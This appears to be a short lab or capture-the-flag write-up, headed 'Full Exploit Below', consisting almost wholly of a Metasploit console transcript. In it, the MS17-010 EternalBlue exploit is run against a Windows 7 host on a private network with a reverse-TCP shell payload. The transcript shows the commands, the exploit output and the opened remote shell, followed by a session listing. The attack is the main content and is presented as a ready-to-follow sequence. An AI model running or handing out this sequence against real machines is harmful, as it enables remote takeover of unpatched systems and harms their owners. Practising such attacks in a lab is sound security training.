
<p><h1>Full Exploit Below,</h1></p>

```
msf6 auxiliary(scanner/smb/smb_enumusers) > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
smsf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/shell/reverse_tp 
payload => windows/x64/shell/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > setg RHOSTS 10.64.151.173
RHOSTS => 10.64.151.173
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit

[*] Started reverse TCP handler on 10.64.83.77:4444 
[*] 10.64.151.173:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.64.151.173:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.64.151.173:445     - Scanned 1 of 1 hosts (100% complete)
[+] 10.64.151.173:445 - The target is vulnerable.
[*] 10.64.151.173:445 - Connecting to target for exploitation.
[+] 10.64.151.173:445 - Connection established for exploitation.
[+] 10.64.151.173:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.64.151.173:445 - CORE raw buffer dump (42 bytes)
[*] 10.64.151.173:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.64.151.173:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.64.151.173:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.64.151.173:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.64.151.173:445 - Trying exploit with 12 Groom Allocations.
[*] 10.64.151.173:445 - Sending all but last fragment of exploit packet
[*] 10.64.151.173:445 - Starting non-paged pool grooming
[+] 10.64.151.173:445 - Sending SMBv2 buffers
[+] 10.64.151.173:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.64.151.173:445 - Sending final SMBv2 buffers.
[*] 10.64.151.173:445 - Sending last fragment of exploit packet!
[*] 10.64.151.173:445 - Receiving response from exploit packet
[+] 10.64.151.173:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.64.151.173:445 - Sending egg to corrupted connection.
[*] 10.64.151.173:445 - Triggering free of corrupted buffer.
[*] Sending stage (336 bytes) to 10.64.151.173
[*] Command shell session 1 opened (10.64.83.77:4444 -> 10.64.151.173:49372) at 2026-04-10 20:49:44 +0000
[+] 10.64.151.173:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.64.151.173:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.64.151.173:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=


Shell Banner:
Microsoft Windows [Version 6.1.7601]
-----

C:\Windows\system32>

```

<p>You can background the session to look for enum tools,</p>

```
          
msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions -l

Active sessions
===============

  Id  Name  Type               Information                  Connection
  --  ----  ----               -----------                  ----------
  1         shell x64/windows  Shell Banner: Microsoft Win  10.64.83.77:4444 -> 10.64.1
                               dows [Version 6.1.7601] ---  51.173:49372 (10.64.151.173
                               --                           )


```
